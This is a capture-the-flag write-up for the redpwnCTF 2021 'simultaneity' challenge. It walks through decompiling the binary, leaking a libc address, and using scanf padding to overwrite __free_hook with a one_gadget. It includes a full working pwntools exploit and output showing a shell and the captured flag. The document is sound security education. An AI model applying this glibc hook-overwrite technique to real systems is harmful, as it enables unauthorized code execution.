# redpwnCTF 2021

## simultaneity

> asphyxia 
> 
> Just an instant remains before the world comes to an end...
> 
> `nc mc.ax 31547`
>
> [libc.so.6](libc.so.6) [ld-linux-x86-64.so.2](ld-linux-x86-64.so.2) [simultaneity](simultaneity)


Tags: _pwn_ _x86-64_ _heap_ _scanf_


## Summary


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place sans canary, perhaps a BOF challenge.


### Decompile with Ghidra

The program will allocate a user defined chuck of RAM, request an offset, and then write 8 bytes to that offset.

```c
void main(void)
{
  long in_FS_OFFSET;
  size_t local_20;
  void *local_18;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("how big?");
  __isoc99_scanf(&%ld,&local_20);
  local_18 = malloc(local_20);
  printf("you are here: %p\n",local_18);
  puts("how far?");
  __isoc99_scanf(&%ld,&local_20);
  puts("what?");
  __isoc99_scanf(&%zu,(void *)((long)local_18 + local_20 * 8));
  _exit(0);
}
```

That `_exit(0)` at the end basically takes care of any potential stack-based buffer overflow.

The `malloc` return isn't being checked for NULL, so using a NULL pointer + the `how far?`; you have an 8-byte _write-what-where_, but where to write?  Need a leak.

`malloc`, with a large size, but not so large to fail and return a NULL pointer, will allocate a chuck that is aligned with base of libc.  This will provide a leak for the `what?` arbitrary 8-byte write.  The natural target is anything ending in `_hook`.

We get one 8-byte write (`what?`) courteous of `scanf`, and that same `scanf` needs to trigger the hook.  With only 8-bytes, _one\_gadget_ is the natural choice.

`scanf` and `printf` will call `malloc/free` with large inputs or output, e.g. with `printf` a `%65536c` format-string will trigger `malloc`, the analog for `scanf` in this challenge is to pad our `what?` with a lot of zeros.  `scanf` will then call `malloc`, process our input, and write out our hook, then call `free`; naturally we'll use `__free_hook`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./simultaneity')

if args.REMOTE:
    p = remote('mc.ax', 31547)
    libc = ELF('./libc.so.6')
    libc.symbols['gadget'] = [0x4484f,0x448a3,0xe5456][1]
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('big?\n','10000000')
p.recvuntil('here: ')
libc.address = int(p.recvline().strip(),16) + 10002416
log.info('libc.address: ' + hex(libc.address))
log.info('libc.sym.__free_hook: ' + hex(libc.sym.__free_hook))

p.sendlineafter('far?\n',str((libc.sym.__free_hook - libc.address + 10002416) // 8))
p.sendlineafter('what?\n',65536*'0' + str(libc.sym.gadget))
p.interactive()
```

To get the gadgets just run `one_gadget ./libc.so.6` and test each of them.

The `10002416` was just measured in gdb.

The `big?` `10000000` was lifted from another [writeup](https://faraz.faith/2019-10-27-backdoorctf-miscpwn/) xfactor sent to me.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/redpwnctf2021/pwn/simultaneity/simultaneity'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mc.ax on port 31547: Done
[*] '/pwd/datajerk/redpwnctf2021/pwn/simultaneity/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fe75f3dc000
[*] libc.sym.__free_hook: 0x7fe75f5998e8
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ cat flag.txt
flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ}
```
